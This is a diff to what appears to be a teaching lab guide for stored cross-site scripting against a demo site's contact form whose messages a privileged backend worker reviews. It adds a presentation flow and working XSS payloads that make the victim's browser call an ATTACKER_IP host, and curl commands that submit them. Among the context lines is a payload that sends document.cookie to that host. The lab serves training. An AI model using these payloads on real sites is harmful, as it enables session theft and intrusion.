@@ -173,9 +173,56 @@ It listens on:
 0.0.0.0:9000
 ```
 
+## Short Presentation Flow
+
+If you want a quick first demo before showing cookie theft or HTML exfiltration, use a plain Python HTTP server on the attacker machine.
+
+Start it with:
+
+```bash
+python3 -m http.server 8000
+```
+
+Expected:
+
+- the terminal prints a log line for every HTTP request received
+- no extra code is needed on the attacker side
+
+Suggested opening narrative:
+
+1. Show that the public landing includes a hint that messages are reviewed in `backend.cross.fit`.
+2. Start `python3 -m http.server 8000` on the attacker machine.
+3. Submit a contact message with a minimal XSS payload that makes a request to that HTTP server.
+4. Wait for the worker to process the message.
+5. Show the request appearing in the Python server log.
+
+This confirms that the JavaScript executed in the privileged browser session tied to `backend.cross.fit`.
+
 ## Payloads
 
 Replace `ATTACKER_IP` with the attacker machine IP.
+
+### Probe request to a manual Python HTTP server
+
+Use this first if you only want to prove code execution against the internal backend:
+
+```html
+<img src=x onerror="new Image().src='http://ATTACKER_IP:8000/ping'">
+```
+
+Same-host validation shortcut:
+
+```html
+<img src=x onerror="new Image().src='http://172.28.0.1:8000/ping'">
+```
+
+Expected on the attacker machine with `python3 -m http.server 8000`:
+
+```text
+"GET /ping HTTP/1.1" 404 -
+```
+
+The `404` is fine. What matters is that the request reached the attacker-controlled server.
 
 ### Visual XSS
 
@@ -242,6 +289,16 @@ curl -i -X POST http://cross.fit/contact \
   -d "email=xss@example.com" \
   -d "phone=099000000" \
   --data-urlencode "message=<img src=x onerror=\"new Image().src='http://ATTACKER_IP:9000/collect?c='+encodeURIComponent(document.cookie)\">"
+```
+
+### Probe request to Python HTTP server
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Probe" \
+  -d "email=xss-probe@example.com" \
+  -d "phone=099000009" \
+  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://ATTACKER_IP:8000/ping'\">"
 ```
 
 ### HTML exfiltration payload
